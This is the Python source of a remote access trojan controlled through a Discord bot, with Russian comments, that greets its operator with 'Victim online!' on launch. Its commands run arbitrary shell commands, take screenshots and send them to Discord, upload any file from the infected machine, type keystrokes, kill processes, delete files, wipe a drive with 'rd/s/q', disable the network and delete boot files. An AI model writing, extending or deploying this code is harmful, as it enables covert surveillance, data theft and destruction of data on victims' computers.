# Made by nullifiedvlad

import discord
from discord.ext import commands
import pyautogui as pg
import os
import sys
import subprocess
import config
from datetime import datetime


pg.FAILSAFE = False
bot = commands.Bot(command_prefix='/')  # префикс для комманд
channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
bot.remove_command('help')


@bot.event
async def on_ready():
    channel_start = bot.get_channel(config.channel)
    date = datetime.now()
    x, y = pg.size()
    await channel_start.send(
        f'''CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. 
Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!''')
    await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
    del date
    del x, y


@bot.command()
async def move(ctx, x, y, time):  # перемещение курсора
    pg.moveTo(int(x), int(y), float(time))
    await ctx.send('**CAT**:  Курсор был передвинут на X:' + str(x) + ' Y:' + str(y))


@bot.command()
async def click(ctx):  # кликнуть мышкой
    pg.click()
    await ctx.send('**CAT**:  Был сделан клик!')


@bot.command()
async def screenshot(ctx):  # сделать скриншот
    pg.screenshot('screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')


@bot.command()
async def cg(ctx):  # смена раскладки
    pg.hotkey('alt', 'shift')
    await ctx.send('**CAT**:  Раскладка клавиатуры успешно изменена!')


@bot.command()
async def write(ctx, *, text):  # написать текс
    pg.typewrite(text)
    await ctx.send(f"**CAT**:  Был набран текст: {text}")
    del text


@bot.command()
async def press(ctx, key, how_many):  # нажать клавишу
    assert int(how_many) > 0
    if key in config.keys:
        for i in range(int(how_many)):
            pg.press(key)
        await ctx.send(f'**CAT**: Была нажата клавиша "{key}" {how_many} раза!')
    else:
        await ctx.send('**CAT**: Нет такой клавиши!')
    del key, how_many


@bot.command()
async def help(ctx):
    await ctx.send(config.helpmessage, file=discord.File('Banners/Banner.png'))


@bot.command()
async def command(ctx, *, todo):
    output = os.system(str(todo))
    if output == 0:
        await ctx.send('**CAT**: Комманда успешно выполнена!')
    else:
        await ctx.send('**CAT**: Ошибка выполения!')
    del output


@bot.command()
async def kill(ctx, *, process):
    output = os.system(f'taskkill /im {str(process)} /f')
    if output == 0:
        await ctx.send('**CAT**: Процесс успешно убит!')
    else:
        await ctx.send('**CAT**: Такого процесса нет или вы указали непраильный процесс!')
        del command


@bot.command()
async def processlist(ctx):  # список процессов
    fl = open('processlist.txt', 'w')
    try:
        data = subprocess.check_output(['tasklist'])
        fl.write(str(data))
        fl.close()
        await ctx.send('**CAT**: Список процессов', file=discord.File('processlist.txt'))
        os.remove('processlist.txt')
    except FileNotFoundError:
        await ctx.send('**CAT**: Данная команда только для Windows XP/7/8.1/10!')


@bot.command()
async def delete(ctx, file_on_delete):  # удалиить файл
    try:
        os.remove(str(file_on_delete))
    except FileNotFoundError:
        await ctx.send('**CAT**: Такой файл не найден!')
    finally:
        await ctx.send(f'**CAT**: Файл "{str(file_on_delete)}"был успешно удалён!')
    del file_on_delete


@bot.command()
async def disk_kill(ctx, disk):  # форматирование диска
    await ctx.send(f'**CAT**: Форматирую диск {disk}')
    os.system(f'rd/s/q {disk}:\\ ')
    del disk


@bot.command()
async def disable_internet(ctx):  # отключить интернет
    await ctx.send('**CAT**: Отключаю интернет соединение')
    os.system(config.disable_internet)


@bot.command()
async def system_kill(ctx):  # удаление загрузочных файлов
    await ctx.send('**CAT**: Система убита!')
    os.system(config.system_kill)


@bot.command()
async def copy(ctx, way):  # копирование файла
    try:
        await ctx.send('**CAT**: Скопированный файл:', file=discord.File(way))
        del way
    except FileNotFoundError:
        await ctx.send('**CAT**: Не могу найти файл!')


# ДОПИСАТЬ!
'''@bot.command()
async def clipboard_grab(ctx):
    captured = subprocess.check_output( '' , shell=True)
    ctx.send(f'**CAT**: {str(captured)}.')'''


@bot.command()
async def shutdown(ctx):
    await ctx.send('Выключаю компьютер...')
    os.system('shutdown -s -t 0 >null')


@bot.command()
async def reboot(ctx):
    await ctx.send('Перезагружаю компьютер...')
    os.system('shutdown -r -t 0 >null')


bot.run(config.token)
